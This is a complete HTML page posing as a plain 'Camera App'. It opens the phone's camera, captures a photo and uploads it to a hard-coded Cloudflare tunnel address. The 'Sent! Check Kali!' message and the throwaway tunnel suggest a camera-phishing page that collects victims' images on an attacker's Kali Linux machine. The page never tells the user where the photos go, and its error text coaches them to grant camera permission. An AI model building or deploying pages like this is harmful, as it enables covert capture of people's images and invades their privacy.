<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#000000">
    <title>Camera App</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body { 
            background: #000; 
            color: #0f0; 
            font-family: monospace; 
            margin: 0; 
            padding: 20px; 
            text-align: center;
        }
        video {
            width: 100%;
            max-width: 400px;
            border-radius: 10px;
            display: none;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 10px;
            margin: 10px;
            cursor: pointer;
            display: block;
            width: 100%;
            max-width: 300px;
            margin: 10px auto;
        }
        .status {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 20px;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h1>📷 Camera App</h1>
    <video id="video" autoplay playsinline muted></video>
    <button onclick="requestCamera()">📷 Start Camera</button>
    <button onclick="capture()" id="snapBtn" style="display:none">📸 Capture & Send</button>
    
    <div class="status" id="status">Tap "Start Camera" to begin</div>

    <script>
        const SERVER_URL = 'https://came-maine-succeed-infants.trycloudflare.com';
        
        async function requestCamera() {
            const status = document.getElementById('status');
            try {
                status.innerText = '⏳ Opening camera...';
                
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                document.getElementById('video').srcObject = stream;
                document.getElementById('video').style.display = 'block';
                document.getElementById('snapBtn').style.display = 'block';
                status.innerText = '✅ Camera ON! Tap Capture to send!';
                
            } catch (err) {
                console.error(err);
                status.innerText = '❌ Error: ' + err.message + '\n\nMake sure camera permission is ALLOWED in browser settings!';
                
                // Try alternative
                if (err.name === 'NotAllowedError') {
                    status.innerText = '❌ Camera blocked!\n\nGo to:\nSettings > Apps > Browser > Permissions > Allow Camera';
                }
            }
        }

        async function capture() {
            const video = document.getElementById('video');
            const status = document.getElementById('status');
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            status.innerText = '📤 Sending...';
            
            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'photo.jpg');
                
                try {
                    await fetch(SERVER_URL, {
                        method: 'POST',
                        body: formData
                    });
                    status.innerText = '✅ Sent! Check Kali!';
                } catch (e) {
                    status.innerText = '❌ Send Error: ' + e.message;
                }
            }, 'image/jpeg', 0.8);
        }
    </script>
</body>
</html>
